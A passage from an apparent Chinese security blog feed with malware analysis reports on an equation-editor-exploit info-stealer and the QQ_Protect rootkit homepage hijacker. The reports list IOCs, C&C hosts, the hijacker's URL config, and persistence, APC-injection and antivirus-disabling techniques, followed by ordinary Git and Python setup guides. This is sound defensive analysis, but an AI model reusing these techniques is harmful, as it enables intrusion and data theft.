src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406164513934-1586174035328.png" alt="image-20200406164513934"></p><p>监控用户操作</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406170505933-1586174035328.png" alt="image-20200406170505933"></p><p>读取注册表</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406170605708-1586174035328.png" alt="image-20200406170605708"></p><p>监控用户进程</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406162309101-1586174035328.png"></p><p>对特定软件（Mozilla, Postbox, Thunderbird, Seamonkey等）的文件读取</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406171639603-1586174035328.png" alt="image-20200406171639603"></p><p>连接到C&amp;C服务器<code>ike2020[.]xyz</code>进行数据接收与上传</p><p>该程序会对用户的剪贴板，注册表，进程列表，浏览器文件，电子邮件数据等关键信息进行读取，并与C&amp;C服务器进行通信。执行过程中主体为Regsvcs.exe，较难被用户察觉，也能规避部分安全软件的检测。</p><h2 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h2><p>为实现持久化，执行过程中写入了3个文件:</p><p>在startup目录下写入LogonUI.url, 指向LogonUI.vbs</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406174645145-1586174035328.png" alt="image-20200406174645145"></p><p>在<code>%USERPROFILE%/LogonUI</code>目录下写入<code>LogonUI.vbs</code>和<code>imjpuexc.exe</code>, 其中前者用于启动后者，后者是恶意程序vbc.exe的拷贝。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406173639573-1586174035328.png" alt="image-20200406173639573"></p><p>通过三个文件的写入，用户每次开机时恶意程序都会通过“接力”的方式实现自启动，达到长期驻留，持续窃取用户隐私的目的。</p><h1 id="关联分析"><a href="#关联分析" class="headerlink" title="关联分析"></a>关联分析</h1><p>通过关联性分析可以发现文件的活跃日期及关联家族信息</p><ol><li>由文件的远程下载地址追踪到关联的IOC信息，可以看到发布日期为3月30日，与日志告警信息一致</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406181344368-1586174035328.png" alt="image-20200406181344368"></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406181633261-1586174035328.png" alt="image-20200406181633261"></p><ol start="2"><li><p>由注入的PE文件名<code>aMpRkoIodsSOGyZREnbQhMVVAJQOtPScNV.exe</code>关联到其他样本</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406182740502-1586174035329.png" alt="image-20200406182740502"></p><table><thead><tr><th>文件名</th><th>bads.exe</th></tr></thead><tbody><tr><td>文件大小</td><td>1814016 bytes</td></tr><tr><td>MD5</td><td>824302d921cb9c615d5e45efe2d1f614</td></tr></tbody></table><p>对该样本<code>bads.exe</code>进行分析，发现除文件名的的差异外与<code>vbc.exe</code>有相同的执行逻辑与恶意行为</p></li><li><p>由文件对应的C&amp;C服务器从源头进行查找</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/13_%E5%85%AC%E5%BC%8F%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20200406184317771-1586174035329.png" alt="image-20200406184317771"></p><p>发现该服务器关联到大量利用手法相同，行为相似的恶意程序且在持续更新，该服务器值得进一步的监测与关注，若发现主机与相关服务器通信应保持警惕。</p></li></ol><h1 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h1><table><thead><tr><th><strong>文件名</strong></th><th><strong>文件大小</strong></th><th><strong>文件类型</strong></th><th><strong>MD5</strong></th></tr></thead><tbody><tr><td><strong>Passwords.xlsx</strong></td><td><strong>579072 bytes</strong></td><td><strong>CDFV2 Encrypted</strong></td><td><strong>CD3A44680F1DC942597F1CC866BCB43E</strong></td></tr><tr><td><strong>vbc.exe</strong></td><td><strong>1904128 bytes</strong></td><td><strong>PE(EXE)</strong></td><td><strong>0A3C56BE44A9B0A25FD25AD8DA0A6D64</strong></td></tr><tr><td><strong>aMpRkoIodsSOGyZREnb-QhMVVAJQOtPScNV.exe</strong></td><td><strong>298496 bytes</strong></td><td><strong>PE(EXE)</strong></td><td><strong>4843D3A562165BAC6464C3150F0A825E</strong></td></tr><tr><td><strong>LogonUI.url</strong></td><td><strong>64 bytes</strong></td><td><strong>URL</strong></td><td><strong>7C8D625461524CC3CFBCFF0A30064EDA</strong></td></tr><tr><td><strong>LogonUI.vbs</strong></td><td><strong>128 bytes</strong></td><td><strong>VB Script</strong></td><td><strong>A902608B53909A3CDB8AFD9D12990043</strong></td></tr><tr><td><strong>imjpuexc.exe</strong></td><td><strong>1904128 bytes</strong></td><td><strong>PE(EXE)</strong></td><td><strong>0A3C56BE44A9B0A25FD25AD8DA0A6D64</strong></td></tr><tr><td><strong>bads.exe</strong></td><td><strong>1814016 bytes</strong></td><td><strong>PE(EXE)</strong></td><td><strong>824302D921CB9C615D5E45EfE2D1F614</strong></td></tr></tbody></table><table><thead><tr><th><strong>C&amp;C服务器1</strong></th><th><strong>ike2020[.]xyz</strong></th></tr></thead><tbody><tr><td><strong>C&amp;C服务器2</strong></td><td><strong>prodigorganizationalgroupoffrdy1company.duckdns[.]org</strong></td></tr><tr><td><strong>互斥量</strong></td><td><strong>Global.net clr networking</strong></td></tr></tbody></table><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p><strong>此次日志告警事件揭露了一起近期开始活跃，通过精心构造的文件进行用户数据窃取的黑客组织攻击，对用户的数据安全发起了巨大的挑战。</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远控 </tag>
            
            <tag> Downloader </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ_Proctect分析报告</title>
      <link href="2020/03/15/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
      <url>2020/03/15/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<center><font size =7><b>QQ_Protect分析报告</b></font></center><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><table><thead><tr><th align="center">样本名称</th><th align="center"><strong>Inst1.exe</strong></th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>锁主页木马</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>465 KB (477,056 字节)</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>d18a3bb153cae03fcc900ec88a2cd5f1</strong></td></tr></tbody></table><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>该样本通过运行带有签名的PE文件，来释放并加载名为QQ_Protect.sys的文件。该驱动文件会监控部分浏览器进程，通过篡改进程启动参数，来实现主页劫持的目的。其中还将ShellCode注入到Winlogon中，来下载要修改的主页配置信息。</p></blockquote><h1 id="简单行为分析"><a href="#简单行为分析" class="headerlink" title="简单行为分析"></a>简单行为分析</h1><p>运行该样本后，释放名为<code>QQ_Protect.sys</code>的驱动文件，并在该路径下并未发现该驱动文件，推测是驱动运行起来后在内核层将其隐藏了，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115133029988.png" alt="image-20200115133029988"></p><p>创建服务，运行释放的<code>QQ_Protect.sys</code>驱动文件，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115134440465.png" alt="image-20200115134440465"></p><p>运行该样本后，迅速结束自身进程，并调用cmd删除自身文件，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115133557943.png" alt="image-20200115133557943"></p><p>APC注入Winlogon进程，在目录<code>C:\ProgramData\gooIe</code>下释放UrlConfig.ini文件，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115135110165.png" alt="image-20200115135110165"></p><p>通过注入Winlogon进程，与C&amp;C服务器<code>43.240.29.146</code>进行通信，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115135224703.png" alt="image-20200115135224703"></p><h1 id="样本详细分析"><a href="#样本详细分析" class="headerlink" title="样本详细分析"></a>样本详细分析</h1><h2 id="释放并加载驱动"><a href="#释放并加载驱动" class="headerlink" title="释放并加载驱动"></a>释放并加载驱动</h2><p>首先查看该<code>Inst1.exe</code>文件，发现其带有正常的数字签名，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115194627854.png" alt="image-20200115194627854"></p><p>在<code>Inst1.exe</code>运行时，首先会检测自身进程可执行文件名是否为==Inst1、Inst2、Inst3==，当不满足时，便退出执行，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115135734252.png" alt="image-20200115135734252"></p><p>然后根据获取到的当前操作系统相关信息，从资源段中取出相应版本的<code>QQ_Protect.sys</code>驱动文件释放到本地目录<code>XWinPiPocE</code>下。具体代码如下：</p><p><strong>获取当前操作系统版本信息，如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115140459052.png" alt="image-20200115140459052"></p><p><strong>根据获得的当前操作系统版本信息，从资源段中释放驱动程序，如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115140241345.png" alt="image-20200115140241345"></p><p><strong>资源中的驱动文件，如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115153238392.png" alt="image-20200115153238392"></p><p>将驱动文件写入到<code>C:\Program File\XWinPiPocE\QQ_Protect</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115140819869.png" alt="image-20200115140819869"></p><p>并且释放出来的驱动文件可能自身驱动保护，通过文件管理系统为不可见。用PC hunter查看该文件，该驱动文件带有数字签名，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115193039948.png" alt="image-20200115193039948"></p><p>然后加载释放出来的<code>QQ_Protect.sys</code>文件，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115141117554.png" alt="image-20200115141117554"></p><p>最后执行完成后调用cmd，删除<code>Inst1.exe</code>文件自身，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115140926621.png" alt="image-20200115140926621"></p><h2 id="APC注入Winlogon进程"><a href="#APC注入Winlogon进程" class="headerlink" title="APC注入Winlogon进程"></a>APC注入Winlogon进程</h2><p>木马运行加载后会设置进程创建回调及模块加载回调，在进程创建回调中监控进程创建事件，如果是浏览器进程则通过==篡改进程启动参数==的方式进行主页劫持。</p><p><strong>设置进程创建回调函数和模块加载回调函数，如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115215311944.png" alt="image-20200115215311944"></p><p><strong>进程创建回调函数<code>sub_40188E</code></strong></p><p>监控浏览器的启动进程，当检测到这些进程时，修改原始进程的CommandLine的参数来实现修改主页的目的。然后将下载链接配置文件的ShellCode注入该进程中，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115215430014.png" alt="image-20200115215430014"></p><p><strong>此外模块加载回调函数<code>NotifyRoutine</code>，还会对一些杀软进行对抗。</strong></p><p>如：SUPERKILLER.exe（360系统急救箱）、QBSAFE（QQ浏览器安全相关组件） 等，将这些进程的入口点函数置空，代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115142935607.png" alt="image-20200115142935607"></p><p><strong>下载劫持链接配置文件</strong></p><p>APC注入进程<code>Winlogon.exe</code>，并执行注入的ShellCode与C&amp;C服务器进行通信，来下载劫持链接的配置文件到目录<code>C:\ProgramData\gooIe</code>的UrlConfig.ini文件中，注入代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115221159385.png" alt="image-20200115221159385"></p><p>函数<code>APC_InJect_4016CC</code>，APC注入代码如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/12_QQ_Protect%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/image-20200115220952041.png" alt="image-20200115220952041"></p><p>下载的配置文件<code>UrlConfig.ini</code>的内容，如图：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[time]</span><br><span class="line">start&#x3D;864001</span><br><span class="line">[urlconfig]</span><br><span class="line">iexplore.exe&#x3D;hao123.ys96.cn</span><br><span class="line">360chrome.exe&#x3D;hao360.ys96.cn</span><br><span class="line">360se.exe&#x3D;hao360.ys96.cn</span><br><span class="line">shouxin.exe&#x3D;hao360.ys96.cn</span><br><span class="line">2345explorer.exe&#x3D;2345m.ys96.cn</span><br><span class="line">qqbrowser.exe&#x3D;2345.ys96.cn</span><br><span class="line">chrome.exe&#x3D;baidu.ys96.cn</span><br><span class="line">liebao.exe&#x3D;baidu.ys96.cn</span><br><span class="line">maxthon.exe&#x3D;baidu.ys96.cn</span><br><span class="line">baidubrowser.exe&#x3D;baidu.ys96.cn</span><br><span class="line">sogouexplorer.exe&#x3D;baidu.ys96.cn</span><br><span class="line">ucbrowser.exe&#x3D;baidu.ys96.cn</span><br><span class="line">firefox.exe&#x3D;baidu.ys96.cn</span><br><span class="line">Juzi.exe&#x3D;baidu.ys96.cn</span><br></pre></td></tr></table></figure><p><strong>然后将根据上面的参数，将要劫持的浏览器的主页篡改到不同的导航页中。</strong></p><h1 id="样本溯源"><a href="#样本溯源" class="headerlink" title="样本溯源"></a>样本溯源</h1><p><strong>释放的文件名及MD5：</strong></p><table><thead><tr><th align="left">MD5</th><th align="left">文件名</th></tr></thead><tbody><tr><td align="left">d18a3bb153cae03fcc900ec88a2cd5f1</td><td align="left">Inst1.exe</td></tr><tr><td align="left">8C12D233D49297CF37A4F422FCC10C3C</td><td align="left">QQ_Protect.sys</td></tr><tr><td align="left">AFDE133FC15DE6C1AFA85D1996E41A88</td><td align="left">QQ_Protect.sys</td></tr><tr><td align="left">F11578779885BFD9735BA65B58614800</td><td align="left">QQ_Protect.sys</td></tr><tr><td align="left">7D8110599DEC7EC23B7D8F10E6A12229</td><td align="left">QQ_Protect.sys</td></tr><tr><td align="left">4AD231C9D5F8F36676EB7CA8750AC5BC</td><td align="left">QQ_Protect.sys</td></tr><tr><td align="left">0182E55CE8FFB518FDE09FE5C06B4B3F</td><td align="left">QQ_Protect.sys</td></tr><tr><td align="left">34CE121730148D536FB48E03ED97916F</td><td align="left">UrlConfig.ini</td></tr></tbody></table><p><strong>C&amp;C服务器：</strong></p><table><thead><tr><th>域名</th><th>IP</th></tr></thead><tbody><tr><td><a href="https://www.wping.org/#pc.589s.cn">pc.589s.cn</a></td><td><a href="https://www.wping.org/#43.240.29.146">43.240.29.146</a></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 样本分析报告 </tag>
            
            <tag> Rootkit </tag>
            
            <tag> 锁主页 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VScode+Git使用说明</title>
      <link href="2020/02/25/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/VScode%20Git%E4%BD%BF%E7%94%A8/"/>
      <url>2020/02/25/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/VScode%20Git%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><font size =8><b>VScode Git 使用说明</b></font></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。</p></blockquote><h2 id="配置-Git-信息"><a href="#配置-Git-信息" class="headerlink" title="配置 Git 信息"></a>配置 Git 信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;&quot; &#x2F;&#x2F;github账户名或gitlib账户名</span><br><span class="line">git config --global user.email xxxx@163.com</span><br></pre></td></tr></table></figure><p><strong>新建本地仓库</strong></p><p>新建一个目录，然后cd到该目录下，执行命令<code>git clone</code>，如克隆我的图床：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Github账户名&#x2F;项目名.git</span><br><span class="line"># 克隆自己的图床</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Azha0&#x2F;ImgHosting.git</span><br></pre></td></tr></table></figure><p>然后将要上传的文件拖入克隆的目录下，我的是<code>ImgHosting</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/04_git%E4%BD%BF%E7%94%A8/image-20201012222015618.png" alt="image-20201012222015618"></p><p>部分Git命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git checkout feature_1000 &#x2F;&#x2F;切换分支，看具体需求，如果是master分支便不需要切换</span><br><span class="line">git add .  &#x2F;&#x2F;添加要上传的文件 .代表当前目录的所有文件</span><br><span class="line">git status &#x2F;&#x2F;查看要上传的文件状态</span><br><span class="line">git commit -a -m &quot;First Commit&quot;  &#x2F;&#x2F; 添加描述信息</span><br><span class="line">git push origin feature_1000     &#x2F;&#x2F;上传到“feature_1000”分支</span><br></pre></td></tr></table></figure><h2 id="VScode使用Git"><a href="#VScode使用Git" class="headerlink" title="VScode使用Git"></a>VScode使用Git</h2><p>当配置好之前操作后，便可以通过VScode来使用Git管理代码，用VScode打开git所在目录或上一层都可（笔者喜欢打开git目录的上一层，这样在配置vscode相关选项不会涉及到同步问题），如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/04_git%E4%BD%BF%E7%94%A8/image-20201012222952242.png" alt="image-20201012222952242"></p><p>然后再解决冲突，选中上图右侧红框标记的选项，然后先添加本地缓冲（步骤1），再输入<code>Commit</code>（步骤2），最后再将缓冲数据进行提交（步骤3），如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/04_git%E4%BD%BF%E7%94%A8/image-20201012223726749.png" alt="image-20201012223726749"></p><p>上一步完成的只是将缓冲数据保存在本地，代码仓库（Github）上的代码并没有得到更行，还需要将本地缓冲进行推送（步骤4），如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/04_git%E4%BD%BF%E7%94%A8/image-20201012224500417.png" alt="image-20201012224500417"></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> VScode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VScode+Python环境配置</title>
      <link href="2020/02/25/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>2020/02/25/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<center><font size =7><b>VScode+Python环境配置</b></font></center><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>近期由于工作的需要，笔者时常需要写些 Python 脚本了，在编写 Python脚本时，就需要搭建一个好的开发环境。而今天的主角 VScode 就是一个很不错的选择。</p><p>VScode 是一个相当优秀的IDE，具备开源、跨平台、模块化、插件丰富、启动时间快、颜值高、可高度定制等等优秀的特质。</p></blockquote><h1 id="0x00-环境配置"><a href="#0x00-环境配置" class="headerlink" title="0x00 环境配置"></a>0x00 环境配置</h1><h2 id="Python-安装"><a href="#Python-安装" class="headerlink" title="Python 安装"></a>Python 安装</h2><p>首先去 Python 官网 <a href="https://www.python.org/">https://www.python.org</a> 下载对应版本的 Python 。</p><p>在安装 Python 时，需要注意一定要记得勾选 <code>Add Python 3.8 to PATH</code> 和 <code>Install launcher for all users</code> 。如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/04_%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/03_Python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E5%8F%8A%E4%B8%AD%E6%96%87%E8%B7%AF%E5%BE%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/image-20200923220737249.png" alt="image-20200923220737249"></p><p>然后选择<code>Customize 